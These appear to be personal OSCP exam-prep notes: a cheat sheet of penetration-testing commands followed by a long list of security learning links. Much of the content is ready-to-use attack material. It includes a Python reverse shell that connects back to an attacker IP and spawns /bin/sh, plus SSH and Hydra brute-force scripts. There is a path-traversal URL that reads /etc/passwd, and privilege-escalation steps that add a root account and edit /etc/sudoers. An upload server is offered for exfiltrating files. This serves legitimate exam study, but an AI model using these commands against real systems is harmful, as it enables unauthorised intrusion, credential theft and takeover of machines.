

###**IP**

ping <target_ip>

**OS**

nmap -O <target_ip>   # OS detection

nmap -A <target_ip>    # Aggressive scan with OS detection and services

nc -nv <target_ip> <port> # Banner grabbing to infer OS from service banner

**open port**

nmap -sV -sC <target_ip>           # Scan for open ports and services

nmap -p- <target_ip>               # Scan all ports (1-65535)

rustscan -a <target_ip> -- -sC -sV


**web tech**

whatweb <target_ip>:<port>   # Identify web technologies

nikto -h <target_ip>   # Look for web technologies and vulnerabilities

wappalyzer


**users**

enum4linux -a <target_ip>   # List SMB users, groups, and shares

cat /etc/passwd             # List users on Linux

msf:

use auxiliary/scanner/smb/smb_enumusers

set RHOSTS <target_ip>

run


**creds**

hydra -l <username> -P <password_list> ssh://<target_ip>

John the Ripper or Hashcat [crack any hash you discover during enumeration]


find / -name "*.conf" -type f 2>/dev/null   # Look for config files that might have creds

grep -ri "password" /                      # Search for passwords in files


**files/dir**

gobuster dir -u http://<target_ip> -w /path/to/wordlist.txt

wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://<target_ip>/FUZZ


**web root**

http://<target_ip>/vulnerable_page.php?file=../../../../etc/passwd

/var/www/html/   # Common web root for Linux servers


**privesc**

./linpeas.sh           # Script to enumerate privesc vectors on Linux

./LinEnum.sh           # Another script for local enumeration


sudo -l   # Check if the current user has sudo privileges [Misconfigured Sudo Permissions check]

find / -perm -u=s -type f 2>/dev/null   # Search for SUID binaries



**initial foothold access**

searchsploit <service or software>   # Find exploits for the services running --

MSF:

use exploit/multi/http/struts2_content_type_ognl   # Example exploit

set RHOST <target_ip>

run 


ssh <username>@<target_ip>


**root level access**

id

whoami

windows winpeas.exe   # Enumerate potential privilege escalation vectors


(SUID Binaries | linux SUID )

find / -perm -u=s -type f 2>/dev/null

/bin/bash -p

https://gtfobins.github.io/


(Misconfigured Sudo Permissions)

sudo vi /etc/passwd

sudo python -c 'import os; os.system("/bin/bash")'


(Kernel Exploits)

uname -a

searchsploit linux kernel <version>


(Exploiting Writable /etc/passwd)

openssl passwd -1

eviluser:x:0:0::/root:/bin/bash

su eviluser


(Cron Jobs)

cat /etc/crontab

ls -la /etc/cron.*


(Writable /etc/sudoers)

echo "harshal ALL=(ALL:ALL) ALL" >> /etc/sudoers

sudo su


(Writable Service Files)

find /etc/systemd/system/ -writable -type f 2>/dev/null


(LinPEAS/Manual Enumeration)

./linpeas.sh

./LinEnum.sh


(Exploit Weak NFS Permissions)

showmount -e <target_ip>


(Escalate via PATH Hijacking)

echo $PATH


**flag**

/home/<username>/local.txt

/home/<compromised_user>/local.txt


/root/proof.txt

-----

cat /root/root.txt

cat /home/<user>/user.txt


type C:\Users\Administrator\Desktop\root.txt

type C:\Users\<user>\Desktop\user.txt



**upload flags**

exam control panel 

copy the content of the flag and paste it into the respective submission field

--

 **report:** prepare and upload to https://upload.offsec.com/ 

////////////////////////////////



=========================


NMAP cmds

nmap -Pn -sS -p- --min-rate=10000 -v [IP Address]
nmap -Pn -sC -sV -O -p [open ports] [IP Address]
nmap -Pn -A -p [open ports] --script=smb-os-discovery,smb-enum-shares,smb-enum-users [IP Address]
nmap -Pn -p 389 --script=ldap-rootdse,ldap-search,ldap-novell-getpass [IP Address]
nmap -Pn -p 445 --script=smb-enum-domains,smb-enum-groups,smb-enum-users [IP Address]

nmap -Pn -p 88 --script=krb5-enum-users [IP Address]
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-syst [IP]
nmap -p 22 --script=ssh-auth-methods,ssh-brute [IP]
nmap -p 25 --script=smtp-enum-users,smtp-open-relay [IP]

nmap -p 53 --script=dns-zone-transfer,dns-nsid [IP]
nmap -p 80,443 --script=http-enum,http-title,http-methods [IP]
nmap -p 110 --script=pop3-capabilities, pop3-ntlm-info [IP]
nmap -p 135,139 --script=msrpc-enum,smb-os-discovery [IP]
nmap -p 143 --script=imap-capabilities [IP]
nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 [IP]
nmap -p 3306 --script=mysql-enum,mysql-brute [IP]
nmap -p 3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020 [IP]
nmap -p 8080 --script=http-enum,http-title [IP]
nmap -p 5900 --script=vnc-info,vnc-brute [IP]
nmap -p 8089 --script=http-title [IP]
nmap -p 2049 --script=nfs-ls,nfs-showmount [IP]
nmap -p 5000 --script=http-title,http-methods [IP]
nmap -p 8081 --script=http-title [IP]
nmap -p 8443 --script=http-enum,http-title [IP]
=
Discover who else is on the network
netdiscover

Discover IP Mac and Mac vendors from ARP
netdiscover -r $ip/24

Nmap stealth scan using SYN
nmap -sS $ip

Nmap stealth scan using FIN
nmap -sF $ip

Nmap Banner Grabbing
nmap -sV -sT $ip

Nmap OS Fingerprinting
nmap -O $ip

Nmap Regular Scan:
nmap $ip/24

Enumeration Scan
nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt

Enumeration Scan All Ports TCP / UDP and output to a txt file
nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip

Nmap output to a file:
nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24

Quick Scan:
nmap -T4 -F $ip/24

Quick Scan Plus:
nmap -sV -T4 -O -F --version-light $ip/24

Quick traceroute
nmap -sn --traceroute $ip

All TCP and UDP Ports
nmap -v -sU -sS -p- -A -T4 $ip

Intense Scan:
nmap -T4 -A -v $ip

Intense Scan Plus UDP
nmap -sS -sU -T4 -A -v $ip/24

Intense Scan ALL TCP Ports
nmap -p 1-65535 -T4 -A -v $ip/24

Intense Scan - No Ping
nmap -T4 -A -v -Pn $ip/24

Ping scan
nmap -sn $ip/24

Slow Comprehensive Scan
nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" $ip/24

Scan with Active connect in order to weed out any spoofed ports designed to troll you
nmap -p1-65535 -A -T5 -sT $ip

Enumeration - DNS Enumeration
NMAP DNS Hostnames Lookup 
nmap -F --dns-server <dns server ip> <target ip range>
=
Nmap port version detection MAXIMUM power
nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>


NFS (Network File System) Enumeration

Show Mountable NFS Shares 
nmap -sV --script=nfs-showmount $ip

=
nmap -v -p 139,445 -oG smb.txt $ip-254

///////////////////////////

////////////////////////////////

3AD and 3 individual machines 

nmap commands

For your OSCP exam with 3 Active Directory (AD) environments and 3 individual machines, here are some effective nmap commands for thorough enumeration:

1. Quick Scan (Initial Recon)

Start with a quick scan to identify open ports.

nmap -Pn -sS -p- --min-rate=10000 -v [IP Address]

	•	-Pn: No ping (skip host discovery to avoid detection issues).
	•	-sS: SYN scan (stealthier than a full TCP connect).
	•	-p-: Scan all 65,535 ports.
	•	--min-rate=10000: Speed up the scan.
	•	-v: Verbose mode.

2. Service Version and OS Detection

Once you know the open ports, run a more detailed scan to enumerate versions and OS.

nmap -Pn -sC -sV -O -p [open ports] [IP Address]

	•	-sC: Default scripts for more detailed info (e.g., vulnerable services).
	•	-sV: Version detection of services.
	•	-O: OS detection.
	•	-p [open ports]: Only scan the open ports identified earlier to save time.

3. Aggressive Scan (For AD)

For Active Directory environments, you want more aggressive information gathering. Use:

nmap -Pn -A -p [open ports] --script=smb-os-discovery,smb-enum-shares,smb-enum-users [IP Address]

	•	-A: Aggressive scan (includes OS detection, version detection, script scanning).
	•	--script: Run specific NSE scripts to enumerate SMB shares and users, which is helpful for AD environments.

4. LDAP Enumeration (For AD)

If LDAP (port 389) is open, run a scan to enumerate users and groups.

nmap -Pn -p 389 --script=ldap-rootdse,ldap-search,ldap-novell-getpass [IP Address]

This will gather valuable information from the LDAP service if it’s exposed.

5. SMB and Kerberos (For AD)

For Active Directory machines, SMB and Kerberos can provide good attack vectors.

nmap -Pn -p 445 --script=smb-enum-domains,smb-enum-groups,smb-enum-users [IP Address]

For Kerberos (port 88):

nmap -Pn -p 88 --script=krb5-enum-users [IP Address]

These commands will help you gather as much initial information as possible to identify potential weaknesses or entry points.


////////////////////////////////

Common usernames  :

Here are some common usernames that are frequently used in OSCP exam machines, especially for services like SSH, FTP, SMB, web applications, and more. These usernames are often paired with weak or default passwords, making them potential targets during your penetration testing.

Common Usernames:

	1.	admin
	2.	administrator
	3.	root
	4.	guest
	5.	user
	6.	test
	7.	ubuntu
	8.	oracle
	9.	postgres
	10.	ftp
	11.	mysql
	12.	apache
	13.	www-data
	14.	nobody
	15.	backup
	16.	support
	17.	service
	18.	developer
	19.	sysadmin
	20.	tomcat (for Apache Tomcat services)
	21.	jenkins (for Jenkins services)
	22.	pi (commonly used in Raspberry Pi or IoT-related machines)
	23.	john (common user for CTF-style boxes)
	24.	bob
	25.	joe

Active Directory Environments:

For Windows or Active Directory environments, these are typical usernames:

	1.	administrator (common in AD setups)
	2.	svc_* (service accounts, e.g., svc_admin)
	3.	helpdesk
	4.	guest
	5.	admin1
	6.	manager
	7.	itadmin
	8.	domainadmin
	9.	backupadmin

Common Naming Conventions:

	•	svc_*: Service accounts often start with svc_.
	•	dev_*: Developer accounts sometimes follow this pattern.
	•	test_*: Accounts related to testing environments.

How to Use These Usernames in Enumeration:

When enumerating usernames via SMB, FTP, SSH, or web-based login forms, you can either:

	•	Use brute-force tools like Hydra or Metasploit to test these usernames against weak passwords.
	•	Use Nmap scripts or Enum4linux to enumerate potential usernames from services.

Example: Brute-Forcing SSH Logins Using Hydra

hydra -L usernames.txt -P passwords.txt ssh://TARGET_IP -t 4

This command uses a list of usernames (usernames.txt) and passwords (passwords.txt) to brute-force an SSH login.

Example: SMB User Enumeration with Enum4linux

enum4linux -a TARGET_IP

This tool helps you enumerate usernames, shares, and other useful information from SMB.

By focusing on these common usernames during your OSCP exam, you can often find weak or misconfigured accounts that can lead to further exploitation.

Good luck with your exam!

////////////////////////////////


**high risk ports** 

 high-risk ports to focus on when scanning during the OSCP exam. These ports are commonly associated with services that could have exploitable vulnerabilities or misconfigurations, making them key targets during your penetration testing:

1. Port 21 (FTP - File Transfer Protocol)

	•	Risks: Anonymous login, weak credentials, plain-text transmission, writable directories.
	•	Nmap Command:

nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-syst [IP]



2. Port 22 (SSH - Secure Shell)

	•	Risks: Weak SSH keys, outdated versions, brute-force attacks.
	•	Nmap Command:

nmap -p 22 --script=ssh-auth-methods,ssh-brute [IP]



3. Port 25 (SMTP - Simple Mail Transfer Protocol)

	•	Risks: Misconfigured mail servers, open relay, information disclosure.
	•	Nmap Command:

nmap -p 25 --script=smtp-enum-users,smtp-open-relay [IP]



4. Port 53 (DNS - Domain Name System)

	•	Risks: DNS zone transfers, misconfigured DNS servers.
	•	Nmap Command:

nmap -p 53 --script=dns-zone-transfer,dns-nsid [IP]



5. Port 80/443 (HTTP/HTTPS - Web Services)

	•	Risks: Web vulnerabilities (e.g., SQL injection, XSS), outdated software.
	•	Nmap Command:

nmap -p 80,443 --script=http-enum,http-title,http-methods [IP]



6. Port 110 (POP3 - Post Office Protocol v3)

	•	Risks: Plain-text authentication, brute-force attacks, vulnerable to man-in-the-middle attacks.
	•	Nmap Command:

nmap -p 110 --script=pop3-capabilities, pop3-ntlm-info [IP]



7. Port 135/139 (Microsoft RPC/NetBIOS)

	•	Risks: Information leakage, SMB-related vulnerabilities (e.g., EternalBlue), weak authentication.
	•	Nmap Command:

nmap -p 135,139 --script=msrpc-enum,smb-os-discovery [IP]



8. Port 143 (IMAP - Internet Message Access Protocol)

	•	Risks: Plain-text transmission, weak credentials.
	•	Nmap Command:

nmap -p 143 --script=imap-capabilities [IP]



9. Port 445 (SMB - Server Message Block)

	•	Risks: Exploits like EternalBlue, SMB enumeration, misconfigurations, weak passwords.
	•	Nmap Command:

nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 [IP]



10. Port 3306 (MySQL)

	•	Risks: Weak/default passwords, SQL injection.
	•	Nmap Command:

nmap -p 3306 --script=mysql-enum,mysql-brute [IP]



11. Port 3389 (RDP - Remote Desktop Protocol)

	•	Risks: Weak authentication, brute-force attacks, BlueKeep vulnerability (CVE-2019-0708).
	•	Nmap Command:

nmap -p 3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020 [IP]



12. Port 8080 (HTTP Alternative)

	•	Risks: Often used for web management interfaces with weak or default credentials, outdated software.
	•	Nmap Command:

nmap -p 8080 --script=http-enum,http-title [IP]



13. Port 5900 (VNC - Virtual Network Computing)

	•	Risks: Weak authentication, remote desktop access.
	•	Nmap Command:

nmap -p 5900 --script=vnc-info,vnc-brute [IP]



14. Port 8089 (Splunk Web Service)

	•	Risks: Default configurations, weak credentials.
	•	Nmap Command:

nmap -p 8089 --script=http-title [IP]



15. Port 2049 (NFS - Network File System)

	•	Risks: Misconfigured shares, allowing unauthorized access to files.
	•	Nmap Command:

nmap -p 2049 --script=nfs-ls,nfs-showmount [IP]



16. Port 5000 (Web Services, Docker)

	•	Risks: Docker misconfigurations, exposed management interfaces.
	•	Nmap Command:

nmap -p 5000 --script=http-title,http-methods [IP]



17. Port 8081 (HTTP Admin Panels)

	•	Risks: Weak or default credentials, outdated admin portals.
	•	Nmap Command:

nmap -p 8081 --script=http-title [IP]



18. Port 8443 (Alternative HTTPS)

	•	Risks: Web applications or management interfaces running insecurely, default credentials.
	•	Nmap Command:

nmap -p 8443 --script=http-enum,http-title [IP]



These high-risk ports and the corresponding services are commonly vulnerable or misconfigured, making them prime targets during the OSCP exam. Always start with Nmap to enumerate open ports, services, and versions, and follow up with relevant exploit attempts or further scanning based on what you find.

////////////////////////////////


 python scripts 

Here are some small Python scripts that can be useful for various tasks in the OSCP exam machines:

1. Simple Reverse Shell (Python)

A basic Python reverse shell to get a connection back to your machine.

On the attacker machine (set up a listener using netcat):

nc -lvnp 4444

On the target machine:

import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('YOUR_IP', 4444))  # Replace YOUR_IP with your attacker's IP
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr
subprocess.call(['/bin/sh', '-i'])

This script opens a reverse shell to your listener.

2. Basic Directory Bruteforcer

If you’re performing web enumeration and want to brute-force directories.

import requests

url = 'http://TARGET_IP/'  # Replace with target IP
wordlist = '/path/to/wordlist.txt'  # Replace with your wordlist

with open(wordlist, 'r') as file:
    for line in file:
        directory = line.strip()
        full_url = url + directory
        response = requests.get(full_url)
        if response.status_code == 200:
            print(f"Found: {full_url}")

This script reads from a wordlist and checks if the directories exist on the target web server.

3. Simple Port Scanner

A quick Python script to scan ports.

import socket

target = 'TARGET_IP'  # Replace with the target IP
ports = [22, 80, 443, 445, 3306, 8080, 3389]  # Add or modify ports as needed

for port in ports:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((target, port))
    if result == 0:
        print(f"Port {port} is open")
    sock.close()

This script checks if the specified ports are open on the target machine.

4. Linux Privilege Escalation Checker

A basic script to help with privilege escalation enumeration on a Linux machine.

import os

def check_sudo():
    print("[+] Checking for sudo privileges...")
    os.system('sudo -l')

def check_suid():
    print("[+] Checking for SUID binaries...")
    os.system('find / -perm -4000 2>/dev/null')

def check_cron():
    print("[+] Checking for cron jobs...")
    os.system('cat /etc/crontab')

if __name__ == "__main__":
    check_sudo()
    check_suid()
    check_cron()

This script checks for sudo privileges, SUID binaries, and cron jobs, which are common privilege escalation vectors.

5. HTTP Server (File Transfer)

A one-liner for file transfer using Python’s built-in HTTP server.

python3 -m http.server 8080

Run this on your attack machine to serve files on port 8080. You can download files from the target machine using wget or curl.

6. Simple File Upload Server (Python)

This script allows file upload to your machine, which is helpful when you need to exfiltrate files.

import http.server
import socketserver

class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        field_data = self.rfile.read(length)
        with open('uploaded_file', 'wb') as f:
            f.write(field_data)
        self.send_response(200)
        self.end_headers()

port = 8000
handler = SimpleHTTPRequestHandler
httpd = socketserver.TCPServer(("", port), handler)
print(f"Serving on port {port}")
httpd.serve_forever()

Run this on your attack machine, and you can send files to it from the target machine with curl or any HTTP tool.

7. Basic SSH Brute Forcer

A simple SSH brute-force script using paramiko.

import paramiko

target_ip = 'TARGET_IP'
username = 'root'
passwords = ['password1', 'password2', 'password3']  # Replace with a list or wordlist

for password in passwords:
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_ip, username=username, password=password)
        print(f"[+] Success: {password}")
        ssh.close()
        break
    except:
        print(f"[-] Failed: {password}")

This brute-forces SSH login with a list of passwords. Be mindful of rate limits or lockout policies.

These Python scripts are lightweight and can help you automate or speed up your penetration testing during the OSCP exam. 


////////////////////////////////

Public Exploit Databases:
	•	Exploit-DB (https://www.exploit-db.com): Useful for finding public exploits for vulnerable software.
	•	PacketStorm Security (https://packetstormsecurity.com): Another resource for finding exploits and security tools.
 


////////////////////////////////

 **last-minute tips :**

	1.	Time Management:
	•	Break down the exam into segments. Spend a set amount of time (e.g., 30 minutes to 1 hour) on each machine before moving to the next. Prioritize the easier ones to gain points quickly.
	2.	Enumeration is Key:
	•	Start every machine with thorough enumeration (use tools like nmap, Gobuster, Nikto, etc.). Information gathered from this will guide your approach.
	3.	Document Everything:
	•	Keep detailed notes of your commands, exploits, and configurations. This will help with report writing and allow you to backtrack if needed.
	4.	Buffer Overflow (if applicable):
	•	Follow the standard methodology: find the offset, control EIP, etc. Refer to your cheat sheets for buffer overflow to ensure a smooth process.
	5.	Privilege Escalation:
	•	For Linux, check for SUID files, weak permissions, or misconfigurations. Use tools like LinPEAS or Linux Smart Enumeration.
	•	For Windows, look into vulnerable services or unquoted paths. Tools like WinPEAS or PowerUp will help here.
	6.	Don’t Panic:
	•	If stuck, take a short break, clear your mind, and come back to it. Sometimes, a fresh perspective helps.
	7.	Exploit Modification:
	•	Be prepared to modify public exploits. Often, they won’t work out-of-the-box. Focus on understanding the code to tweak it if necessary.
	8.	Buffer Management:
	•	Allocate your time carefully. If you’re spending too much time on one machine, move on to another.
	9.	Have Backups:
	•	Make sure you have all the required tools installed and working before the exam. Keep your VPN connection stable.
	10.	Focus on Points:

	•	Remember, the goal is to hit the passing score, so prioritize systems based on difficulty and your strengths.




//////////////////////////////



 Security:
            Sources:
                https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html-single/using_selinux (Using SELinux)
                https://allinfosecnews.com (Aggregates all of the top news, podcasts and more about Cyber Security, InfoSec, Cryptography, Online Privacy, Hacking, Vulnerability and Threat Research into one place.)
                https://aws.amazon.com/training/digital/aws-security-fundamentals (AWS Security Fundamentals (Second Edition))
                https://aws.github.io/aws-security-services-best-practices (AWS Security Services Best Practices)
                https://cheatsheetseries.owasp.org (The OWASP Cheat Sheet Series was created to provide a concise collection of high value information on specific application security topics.)
                https://cloud.redhat.com/blog/top-open-source-kubernetes-security-tools-of-2021 (Top Open Source Kubernetes Security Tools of 2021)
                https://cloudseclist.com (A low volume newsletter (delivered once per week) that highlights security-related news focused on the cloud native landscape, hand curated by Marco Lancini.)
                https://crowdsec.net (CrowdSec is an open-source and collaborative IPS for Linux)
                https://danielmiessler.com/blog/build-successful-infosec-career (How to Build a Cybersecurity Career [ 2019 Update ])
                https://dev-sec.io (devops + security Server Hardening Automation Using Ansible)
                https://en.wikipedia.org/wiki/List_of_computer_security_certifications#Most_Popular_Vendor_Neutral_Cyber_Security_Certifications_Among_employers
                https://gist.github.com/securibee/054d4588e7f4dc892ae603c963558943 (The InfoSec OPML File by Securibee)
                https://github.com/0x90n/InfoSec-Black-Friday (All the deals for InfoSec related software/tools this Black Friday)
                https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks (A huge chunk of my personal notes since I started playing CTFs and working as a Red Teamer.)
                https://github.com/0xsyr0/OSCP (OSCP Cheat Sheet)
                https://github.com/4ndersonLin/awesome-cloud-security (Awesome Cloud Security Resources)
                https://github.com/6mile/DevSecOps-Playbook (This is a step-by-step guide to implementing a DevSecOps program for any size organization)
                https://github.com/Arudjreis/awesome-security-GRC (Curated list of resources for security Governance, Risk Management, Compliance and Audit professionals and enthusiasts (if they exist).)
                https://github.com/Az0x7/vulnerability-Checklist (This repository contain a lot of web and api vulnerability checklist , a lot of vulnerability ideas and tips from twitter)
                https://github.com/chughes29/Cloud-DevSecOps-Learning/blob/main/Cloud%20%26%20DevSecOps%20Learning%20(1).md (Cloud-DevSecOps-Learning)
                https://github.com/dafthack/CloudPentestCheatsheets (This repository contains a collection of cheatsheets I have put together for tools related to pentesting organizations that leverage cloud providers.)
                https://github.com/danielmiessler/SecLists (It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.)
                https://github.com/decalage2/awesome-security-hardening (A collection of awesome security hardening guides, tools and other resources)
                https://github.com/edoardottt/awesome-hacker-search-engines (A list of search engines useful during Penetration testing, vulnerability assessments, red team operations, bug bounty and more)
                https://github.com/fabionoth/awesome-cyber-security (A collection of awesome software, libraries, documents, books, resources and cools stuffs about security.)
                https://github.com/farhanashrafdev/90DaysOfCyberSecurity (This repository contains a 90-day cybersecurity study plan, along with resources and materials for learning various cybersecurity concepts and technologies. The plan is organized into daily tasks, covering topics such as Network+, Security+, Linux, Python, Traffic Analysis, Git, ELK, AWS, Azure, and Hacking. The repository also includes a `LEARN.md )
                https://github.com/forter/security-101-for-saas-startups (security tips for startups)
                https://github.com/google/security-research (https://about.google/appsecurity This project hosts security advisories and their accompanying proof-of-concepts related to research conducted at Google which impact non-Google owned code)
                https://github.com/Gr1mmie/Practical-Ethical-Hacking-Resources (Compilation of Resources from TCM's Practical Ethical Hacking Udemy Course )
                https://github.com/gracenolan/Notes (Security Engineering at Google: My Interview Study Notes)
                https://github.com/Hack-with-Github/Awesome-Hacking (A collection of various awesome lists for hackers, pentesters and security researchers)
                https://github.com/HACKE-RC/awesome-reversing (A collection of resources to learn Reverse Engineering from start!)
                https://github.com/HadessCS/Red-team-Interview-Questions (Red team Interview Questions)
                https://github.com/hahwul/DevSecOps ( 🔱 Collection and Roadmap for everyone who wants DevSecOps. Hope your DevOps are more safe 😎)
                https://github.com/hysnsec/awesome-policy-as-code (A curated list of policy-as-code resources like blogs, videos, and tools to practice on for learning Policy-as-Code.)
                https://github.com/iknowjason/Awesome-CloudSec-Labs (Awesome free cloud native security learning labs. Includes CTF, self-hosted workshops, guided vulnerability labs, and research labs.)
                https://github.com/imthenachoman/How-To-Secure-A-Linux-Server (An evolving how-to guide for securing a Linux server.)
                https://github.com/instadoodledavid/Infosec-Deals (Ongoing Infosec Deals 2021)
                https://github.com/jassics/awesome-aws-security (Curated list of links, references, books videos, tutorials (Free or Paid), Exploit, CTFs, Hacking Practices etc. which are related to AWS Security)
                https://github.com/jassics/security-study-plan (Complete Practical Study Plan to become a successful cybersecurity engineer based on roles like Pentest, AppSec, Cloud Security, DevSecOps and so on...)
                https://github.com/jatrost/awesome-kubernetes-threat-detection (A curated list of resources about detecting threats and defending Kubernetes systems.)
                https://github.com/krol3/container-security-checklist (Checklist for container security - devsecops practices)
                https://github.com/Legit-Labs/legitify (https://legitify.dev Detect and remediate misconfigurations and security risks across all your GitHub and GitLab assets)
                https://github.com/LetsDefend/SOC-Interview-Questions (SOC Interview Questions)
                https://github.com/Lissy93/awesome-privacy (🦄 A curated list of privacy & security-focused software and services)
                https://github.com/Lissy93/personal-security-checklist (https://digital-defense.io 🔒 A compiled checklist of 300+ tips for protecting digital security and privacy in 2024)
                https://github.com/mazen160/secrets-patterns-db (Secrets Patterns DB: The largest open-source Database for detecting secrets, API keys, passwords, tokens, and more.)
                https://github.com/microsoft/Security-101 (https://microsoft.github.io/Security-101 7 Lessons, Kick-start Your Cybersecurity Learning.)
                https://github.com/mikeprivette/awesome-sec-challenges (A curated list of Awesome Security Challenges.)
                https://github.com/myugan/awesome-cicd-security (📚 A curated list of awesome CI CD security resources)
                https://github.com/myugan/awesome-docker-security (A curated list of awesome Docker security resources)
                https://github.com/n0kovo/awesome-password-cracking (A curated list of awesome tools, research, papers and other projects related to password cracking and password security.)
                https://github.com/OWASP/CheatSheetSeries (The OWASP Cheat Sheet Series was created to provide a concise collection of high value information on specific application security topics.)
                https://github.com/pluja/awesome-privacy (A curated list of services and alternatives that respect your privacy because PRIVACY MATTERS.)
                https://github.com/qazbnm456/awesome-web-security (🐶 A curated list of Web Security materials and resources)
                https://github.com/sbilly/awesome-security (A collection of awesome software, libraries, documents, books, resources and cools stuffs about security.)
                https://github.com/security-prince/Application-Security-Engineer-Interview-Questions (Some of the questions which i was asked when i was giving interviews for Application/Product Security roles.)
                https://github.com/shreyaschavhan/oscp-pre-preparation-plan-and-notes (𝐎𝐒𝐂𝐏 𝐏𝐫𝐞-𝐏𝐫𝐞𝐩𝐚𝐫𝐚𝐭𝐢𝐨𝐧 𝐏𝐥𝐚𝐧 𝐚𝐧𝐝 𝐍𝐨𝐭𝐞𝐬)
                https://github.com/sottlmarek/DevSecOps (Ultimate DevSecOps library)
                https://github.com/swisskyrepo/PayloadsAllTheThings (https://swisskyrepo.github.io/PayloadsAllTheThings A list of useful payloads and bypass for Web Application Security and Pentest/CTF)
                https://github.com/tadwhitaker/Security_Architect_and_Principal_Security_Engineer_Interview_Questions (Security Architect and Principal Security Engineer Interview Questions)
                https://github.com/tadwhitaker/Security_Engineer_Interview_Questions (Every Security Engineer Interview Question From Glassdoor.com )
                https://github.com/TalEliyahu/awesome-security-newsletters (Periodic cyber security newsletters that capture the latest news, summaries of conference talks, research, best practices, tools, events, vulnerabilities, and analysis of trending threats and attacks)
                https://github.com/tldrsec/awesome-secure-defaults (Awesome secure by default libraries to help you eliminate bug classes!)
                https://github.com/topics/devsecops?o=desc&s=stars
                https://github.com/topics/oscp?o=desc&s=stars
                https://github.com/topics/security?o=desc&s=stars
                https://github.com/topics/websecurity?o=desc&s=stars
                https://github.com/veeral-patel/learn-security-engineering (How to systematically secure anything: a repository about security engineering)
                https://github.com/vulnerable-apps (Over 100 forks of deliberately vulnerable web applications and APIs.)
                https://github.com/z1pti3/jimi (Jimi is an automation first no-code platform designed and developed originally for Security Orchestration and Response. Since its launch jimi has developed into a fully fledged IT automation platform which effortlessly integrates with your existing tools unlocking the potential for autonomous IT and Security operations.)
                https://ishaqmohammed.me/posts/application-security-knowledgebase (Application Security Knowledgebase)
                https://jhalon.github.io/becoming-a-pentester (So You Want To Be a Pentester? (Updated 2023))
                https://k8slanparty.com (A CTF designed to challenge your Kubernetes hacking skills through a series of critical network vulnerabilities and misconfigurations)
                https://krebsonsecurity.com/2020/07/thinking-of-a-cybersecurity-career-read-this (Thinking of a Cybersecurity Career? Read This)
                https://kubernetes.io/docs/concepts/security/security-checklist (Kubernetes Security Checklist)
                https://media.defense.gov/2022/Mar/01/2002947139/-1/-1/0/CTR_NSA_NETWORK_INFRASTRUCTURE_SECURITY_GUIDANCE_20220301.PDF (National Security Agency Cybersecurity Technical Report Network Infrastructure Security Guidance March 2022)
                https://myaccount.google.com/stateattackwarning (Find out if someone is trying to access your Google account)
                https://news.ycombinator.com/item?id=12140477 (A practical security guide for web developers (github.com))
                https://news.ycombinator.com/item?id=14791255 (Cybersecurity Humble Book Bundle)
                https://news.ycombinator.com/item?id=15986100 (Ask HN: How can I learn computer security?)
                https://news.ycombinator.com/item?id=17563857 (Ask HN: What are the best resources for learning security and pen testing?)
                https://news.ycombinator.com/item?id=17749283 (Ask HN: Recommendations of good cybercrime novels?)
                https://news.ycombinator.com/item?id=18487547 (Ask HN: Starting a career in security at 40?)
                https://news.ycombinator.com/item?id=29577272 (Clever uses of pass, the Unix password manager (vitalyparnas.com))
                https://news.ycombinator.com/item?id=38331501 (Ask HN: Any comprehensive courses on Auth?)
                https://opensourcesecurityindex.io (The Most Popular & Fastest Growing Open Source Security Projects on GitHub)
                https://overthewire.org/wargames/bandit (The Bandit wargame is aimed at absolute beginners. It will teach the basics needed to be able to play other wargames.)
                https://portswigger.net/research/top-10-web-hacking-techniques-of-2023 (Top 10 web hacking techniques of 2023 by James Kettle)
                https://ppn.snovvcrash.rocks (Pentester's promiscuous handbook)
                https://reynardsec.com/en/docker-platform-security-step-by-step-hardening (Docker Security – Step-by-Step Hardening (Docker Hardening))
                https://room362.com/start (Start in Infosec)
                https://s3ctur.wordpress.com/2017/06/19/breaking-into-infosec-a-beginners-curriculum (Breaking into InfoSec: A Beginners Curriculum)
                https://security.stackexchange.com/questions/46666/at-what-length-does-a-password-stop-making-sense (At what length does a password stop making sense?)
                https://sgtdede.gitbook.io/hacking/oscp-2022/guide-en (OSCP guide 2022)
                https://softwareanalyst.substack.com/p/the-beginners-guide-to-cybersecurity (The Beginner's Guide to Cybersecurity)
                https://sysdig.com/blog/top-owasp-kubernetes (The OWASP Kubernetes Top 10 puts all possible risks in an order of overall commonality or probability.)
                https://tcm-sec.com/so-you-want-to-be-a-hacker-2021-edition (So You Want to Be a Hacker: 2021 Edition)
                https://tib3rius.com/interview-questions.html (Web AppSec Interview Questions)
                https://tldrsec.com/p/kubernetes-security-threat-informed-defense (Keep Hackers Out of Your Kubernetes Cluster with These 5 Simple Tricks!)
                https://tldrsec.com/p/software-supply-chain-vendor-landscape (Software Supply Chain Vendor Landscape)
                https://tls13.xargs.org (The Illustrated TLS 1.3 Connection Every byte explained and reproduced)
                https://toc.cryptobook.us (A Graduate Course in Applied Cryptography)
                https://tryhackme.com/r/resources/blog/security-engineer-interview-guide (Preparing for a Security Engineering Interview)
